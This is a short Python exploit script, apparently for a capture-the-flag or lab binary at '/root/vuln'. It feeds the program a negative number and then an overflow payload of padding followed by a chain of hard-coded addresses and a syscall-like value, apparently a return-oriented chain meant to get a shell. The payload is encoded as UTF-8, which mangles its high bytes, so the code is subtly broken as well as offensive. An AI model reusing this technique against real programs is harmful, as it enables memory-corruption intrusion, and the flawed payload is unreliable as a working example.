import subprocess

p = subprocess.Popen("/root/vuln", stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)

# Run `gdb vuln $(pgrep vuln)` on remote machine to attach!
input("Press Enter to continue...")


def read_line():
    print(p.stdout.readline().decode("utf-8").strip())


read_line()

print("-1")
p.stdin.write("-1\n".encode("utf-8"))
p.stdin.flush()

read_line()

input = 20*"A" +\
        "\xFF" +\
        8*"\x00" +\
        8*"\x00" +\
        8*"\x00" +\
        "\x76\x11\x40\x00" + 4*"\x00" +\
        "\x0b" + 7*"\x00" +\
        "\x78\x11\x40\x00" + 4*"\x00" +\
        8*"\x00" +\
        "\x0a\x14\x40\x00" + 4*"\x00" +\
        "\x08\x20\x40\x00" + 4*"\x00" +\
        8*"\x00" +\
        8*"\x00" +\
        8*"\x00" +\
        8*"\x00" +\
        8*"\x00" +\
        "\x7a\x11\x40\x00" + 4*"\x00"

print(input.encode())  # debug print to verify for ourselves
p.stdin.write(input.encode("utf-8"))
p.stdin.flush()

read_line()
read_line()

print(p.wait())
